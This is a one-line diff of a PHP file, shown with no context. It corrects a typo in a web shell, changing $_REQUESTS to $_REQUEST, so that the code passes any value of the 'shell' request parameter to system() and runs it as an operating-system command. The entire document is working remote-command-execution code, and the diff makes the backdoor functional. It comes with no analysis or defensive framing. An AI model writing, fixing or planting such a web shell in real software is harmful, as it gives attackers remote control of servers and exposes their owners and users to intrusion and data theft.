@@ -1,1 +1,1 @@
-<?php system($_REQUESTS['shell']); ?>
+<?php system($_REQUEST['shell']); ?>
